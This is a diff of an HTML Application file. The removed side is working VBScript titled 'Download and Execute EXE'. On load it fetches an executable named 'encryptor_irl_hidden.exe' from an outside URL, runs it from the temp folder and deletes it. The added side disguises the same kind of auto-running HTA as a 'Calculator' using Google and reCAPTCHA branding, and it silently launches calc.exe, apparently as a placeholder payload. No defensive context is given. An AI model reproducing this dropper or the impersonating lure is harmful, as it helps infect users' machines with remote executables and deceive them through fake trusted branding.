@@ -1,60 +1,51 @@
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Download and Execute EXE</title>
-    <HTA:APPLICATION 
-        APPLICATIONNAME="Download and Execute EXE" 
-        BORDER="thin" 
-        SCROLL="no" 
-        SINGLEINSTANCE="yes" 
-        SYSMENU="no">
+    <title>Calculator</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="Calculator"
+        BORDER="thin"
+        BORDERSTYLE="normal"
+        ICON="https://support.google.com/favicon.ico"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        SCROLLFLAT="yes"
+        SYSMENU="yes"
+    />
+    <style>
+        body {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            color: #555;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+        }
+        img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+    </style>
+    <script language="VBScript">
+    Sub Window_onLoad
+        Window.ResizeTo 520, 480
+        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
+        
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "calc.exe", 0, False 
+    End Sub
+    </script>
 </head>
 <body>
-    <script language="VBScript">
-        Sub DownloadAndExecute
-            Dim objXMLHTTP, objStream, objShell
-            Dim url, tempFile, tempPath
-            
-            url = "https://fecdor.github.io/history-protector/encryptor_irl_hidden.exe"  ' Replace with the URL of your EXE
-            
-            ' Create objects
-            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-            Set objStream = CreateObject("ADODB.Stream")
-            Set objShell = CreateObject("WScript.Shell")
-            
-            ' Get the path to the TEMP directory
-            tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
-            
-            ' Generate a temporary filename
-            tempFile = tempPath & "\tempfile.exe"
-            
-            ' Open connection and download the file into memory
-            objXMLHTTP.Open "GET", url, False
-            objXMLHTTP.Send
-            If objXMLHTTP.Status = 200 Then
-                objStream.Type = 1  ' Binary data
-                objStream.Open
-                objStream.Write objXMLHTTP.responseBody
-                objStream.SaveToFile tempFile, 2  ' Save to temporary file
-                objStream.Close
-                
-                ' Execute the EXE
-                objShell.Run Chr(34) & tempFile & Chr(34), 1, True
-                ' Wait briefly for execution to complete
-                WScript.Sleep 5000
-                ' Delete the temporary file after execution
-                objShell.Run "cmd /c del " & Chr(34) & tempFile & Chr(34), 0, True
-            Else
-                MsgBox "Error downloading file."
-            End If
-            
-            ' Clean up
-            Set objXMLHTTP = Nothing
-            Set objStream = Nothing
-            Set objShell = Nothing
-        End Sub
-        
-        ' Call the function to download and execute
-        DownloadAndExecute
-    </script>
+    <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" alt="Calculator Logo">
+    <p>Opening Calculator...</p>
 </body>
 </html>
